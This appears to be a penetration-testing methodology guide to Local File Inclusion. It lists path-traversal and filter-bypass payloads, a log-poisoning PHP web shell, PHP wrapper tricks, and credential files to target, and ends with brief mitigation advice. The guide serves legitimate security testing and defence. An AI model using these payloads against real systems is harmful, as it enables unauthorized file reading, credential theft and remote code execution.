### Local File Inclusion (LFI) Vulnerability

---

### 1. **Understanding Local File Inclusion (LFI) Vulnerability**

- **Definition**: LFI allows an attacker to include files on the server running the application. This inclusion could happen in any script that takes user input to include or require files.
- **Impact**:
    - **Information Disclosure**: Reading sensitive files like `/etc/passwd` or application configuration files.
    - **Remote Code Execution (RCE)**: Under certain conditions (e.g., log poisoning), executing arbitrary commands or scripts.
    - **Directory Traversal**: Accessing files outside of the web root using path traversal sequences such as `../../`.

### 2. **Initial Reconnaissance and Discovery**

- **Objective**: Identify parameters that could be susceptible to LFI.
- **Approach**:
    - **URL Analysis**: Review URLs and identify parameters (e.g., `?file=`, `?page=`, `?lang=`, `?template=`, etc.) that may take file paths as input.
    - **Automated Scanning**: Use tools like Burp Suite, OWASP ZAP, and Nikto to scan for LFI vulnerabilities.
    - **Source Code Analysis**: If access to the source code is available, look for functions like `include()`, `require()`, `fopen()`, `file_get_contents()`, `readfile()`, etc., which may process user input.

### 3. **Manual Testing for LFI**

### Step 3.1: **Basic LFI Payloads**

- **Objective**: Test the application's response to various basic LFI payloads.
- **Payloads**: Start with common path traversal sequences to check for file inclusion.
    - `../../../../../../etc/passwd`
    - `../../../../../../windows/system32/drivers/etc/hosts`
    - `../../../../../../var/www/html/index.php`
- **Example HTTP Request**:
    
    ```
    GET /vulnerable.php?page=../../../../../../etc/passwd HTTP/1.1
    Host: target.com
    
    ```
    
- **Interpret Response**:
    - If the response contains content from the targeted file (e.g., `/etc/passwd`), the LFI vulnerability is confirmed.

### Step 3.2: **Bypass Filters and Input Sanitization**

- **Objective**: Circumvent input validation or sanitization filters.
- **Techniques**:
    - **URL Encoding**: Encode characters to bypass filters (e.g., `../../%2f%2e%2e%2f%2e%2e%2f%2e%2e/etc/passwd`).
    - **Double URL Encoding**: Double encode the path traversal sequences (e.g., `%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e/etc/passwd`).
    - **Null Byte Injection**: Use null byte (`%00`) to terminate the input string and bypass certain filters or extensions (e.g., `../../../../../../etc/passwd%00.jpg`).

### Step 3.3: **Windows-Specific Payloads**

- **Objective**: Test for LFI on Windows-based servers.
- **Payloads**:
    - `..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\windows\\\\system.ini`
    - `..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\windows\\\\win.ini`
    - `..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\windows\\\\System32\\\\drivers\\\\etc\\\\hosts`
- **Example HTTP Request**:
    
    ```
    GET /vulnerable.php?page=..\\\\..\\\\..\\\\..\\\\windows\\\\win.ini HTTP/1.1
    Host: target.com
    
    ```
    

### 4. **Advanced Techniques for LFI Exploitation**

### Step 4.1: **Log File Poisoning for Remote Code Execution (RCE)**

- **Objective**: Achieve RCE by injecting malicious payloads into server logs and then including those logs through LFI.
- **Technique**:
    - **Inject Malicious PHP Payload**: Inject payloads into server logs such as access logs, error logs, mail logs, etc. Common payload:
        - `<?php system($_GET['cmd']); ?>`
    - **Example Injection**:
        
        ```
        GET /<?php system($_GET['cmd']); ?> HTTP/1.1
        User-Agent: <?php system($_GET['cmd']); ?>
        Host: target.com
        
        ```
        
    - **Access the Log File via LFI**:
        - Example: `/vulnerable.php?page=../../../../var/log/apache2/access.log&cmd=id`
    - **Interpret Response**: If the command executes and returns output, RCE is achieved.

### Step 4.2: **PHP Wrappers for LFI Exploitation**

- **Objective**: Use PHP stream wrappers to bypass restrictions or gain deeper access.
- **Common PHP Wrappers**:
    - `php://filter` for source code disclosure:
        - Payload: `php://filter/convert.base64-encode/resource=../../../../../../etc/passwd`
        - Use `base64` decoding to view the source code.
    - `php://input` to read POST data:
        - Use this to include POST data directly, allowing you to craft more complex payloads.
    - `expect://` (if enabled) for direct command execution:
        - Payload: `expect://ls`
- **Example HTTP Request Using PHP Wrapper**:
    
    ```
    GET /vulnerable.php?page=php://filter/convert.base64-encode/resource=index.php HTTP/1.1
    Host: target.com
    
    ```
    

### Step 4.3: **Null Byte Injection Techniques**

- **Objective**: Bypass input filters or restrictions.
- **Payloads**:
    - `../../../../../../etc/passwd%00`
    - `../../../../../../windows/win.ini%00.html`
- **Purpose**: The null byte (`%00`) truncates the input, allowing it to bypass filename extensions or validation checks.

### 5. **Exfiltration and Further Exploitation**

- **Objective**: Extract sensitive information and explore further attack vectors.
- **Common Targets for Exfiltration**:
    - **System Files**: `/etc/passwd`, `/etc/shadow` (if accessible), `C:\\Windows\\system32\\config\\SAM`.
    - **Configuration Files**: Database configurations like `wp-config.php`, `.env` files, or any other file containing sensitive credentials.
    - **Log Files**: To locate log files, check common locations such as `/var/log/apache2/access.log`, `/var/log/nginx/error.log`, etc.

### 6. **Mitigating LFI Vulnerabilities**

- **Objective**: Implement secure coding practices to prevent LFI.
- **Defense Techniques**:
    - **Input Validation**: Whitelist allowed input values rather than blacklist.
    - **Sanitization**: Properly sanitize user inputs by removing any dangerous characters like `..`, `/`, and `\\`.
    - **Disable Unnecessary PHP Wrappers**: Disable unnecessary wrappers such as `expect://` in the `php.ini` configuration.
    - **Limit File Permissions**: Restrict file permissions to prevent unauthorized access to sensitive files.
    - **Use Secure Functions**: Prefer safer functions that do not directly take user input for file operations.

### 7. **Testing with Automated Tools**

- **Tools to Use**:
    - **Burp Suite Intruder/Repeater**: Automate payload injections and monitor responses.
    - **ffuf/gobuster**: Directory brute-forcing and file enumeration.
    - **Nikto**: Basic web server scanning to identify potential LFI endpoints.
    - **Custom Scripts**: Develop Python or Bash scripts for fuzzing potential LFI parameters with payloads.

### 8. **Crafting Exploit Payloads for Practical Scenarios**

- **Considerations**:
    - Evaluate server-side configurations (OS, web server type, PHP configurations).
    - Determine potential writable directories (`/tmp`, `C:\\Windows\\Temp`).
    - Assess what log files are accessible and writable.
